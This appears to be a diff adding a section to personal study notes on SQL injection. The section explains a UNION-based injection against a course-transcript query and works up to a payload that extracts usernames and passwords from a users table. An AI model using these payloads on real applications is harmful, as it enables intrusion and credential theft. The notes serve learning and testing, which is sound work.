@@ -322,3 +322,41 @@ If they behave differently like this → **injection is working**.
 If both show the same results regardless → injection is not working, output is being sanitized. 
 
 **500** means your SQL syntax broke something server-side — useful because it confirms the input is reaching SQL, but you **need to fix your syntax.**
+
+![[Pasted image 20260602152745.png]]
+
+**The original query the app runs:**
+
+sql
+
+```sql
+SELECT course_code, course_name, grade 
+FROM transcripts 
+WHERE course_code LIKE 'asd'
+```
+
+**What the injection does:**
+
+sql
+
+```sql
+SELECT course_code, course_name, grade 
+FROM transcripts 
+WHERE course_code LIKE 'asd' 
+UNION SELECT 1 --'
+```
+**Why UNION?** UNION lets you **attach a completely different SELECT statement** and have its results appear alongside (or instead of) the original results. Unlike `OR 1=1` which just bypasses a condition, UNION actually **extracts data from other tables**.
+
+**Why `SELECT 1`?** Just a test — you're checking if UNION works at all. The `1` is a placeholder. You need to match the number of columns the original query returns (3 in this case — course_code, course_name, grade).
+
+**So the next step would be:**
+
+```
+asd' UNION SELECT 1,2,3 --
+```
+Then replace those numbers with actual data you want:
+
+```
+asd' UNION SELECT username, password, 3 FROM users --
+```
+
